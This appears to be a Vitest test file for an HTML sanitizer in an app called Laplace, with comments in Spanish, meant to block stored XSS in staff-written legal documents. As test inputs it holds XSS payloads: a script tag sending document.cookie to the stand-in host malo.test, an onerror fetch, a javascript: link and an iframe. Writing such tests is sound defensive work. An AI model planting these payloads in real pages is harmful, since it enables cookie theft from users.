import { describe, expect, it } from 'vitest';
import { sanitizeHtml } from './sanitize.js';

/**
 * El HTML de un documento legal lo escribe el staff del centro, no Laplace
 * (§2.1.20): una cuenta de staff comprometida no tiene que poder convertirse
 * en un XSS almacenado contra cada socio que abre la WAFM.
 */
describe('sanitizeHtml', () => {
  it('deja pasar el formato normal de un documento', () => {
    const limpio = sanitizeHtml(
      '<h2>Título</h2><p>Un <strong>párrafo</strong> con <em>énfasis</em>.</p>',
    );

    expect(limpio).toContain('<h2>Título</h2>');
    expect(limpio).toContain('<strong>párrafo</strong>');
  });

  it('saca un `<script>` entero', () => {
    const limpio = sanitizeHtml(
      '<p>Hola</p><script>fetch("https://malo.test?c="+document.cookie)</script>',
    );

    expect(limpio).not.toContain('<script');
    expect(limpio).not.toContain('malo.test');
  });

  it('saca un manejador `onerror` de una imagen', () => {
    const limpio = sanitizeHtml('<img src="x" onerror="fetch(\'https://malo.test\')">');

    expect(limpio).not.toContain('onerror');
    expect(limpio).not.toContain('malo.test');
  });

  it('saca un link `javascript:`', () => {
    const limpio = sanitizeHtml('<a href="javascript:alert(1)">clickeame</a>');

    expect(limpio).not.toContain('javascript:');
  });

  it('deja un link `https://` normal', () => {
    const limpio = sanitizeHtml('<a href="https://laplace.app/terminos">términos</a>');

    expect(limpio).toContain('href="https://laplace.app/terminos"');
  });

  it('saca un `<iframe>`', () => {
    const limpio = sanitizeHtml('<iframe src="https://malo.test"></iframe>');

    expect(limpio).not.toContain('<iframe');
  });
});
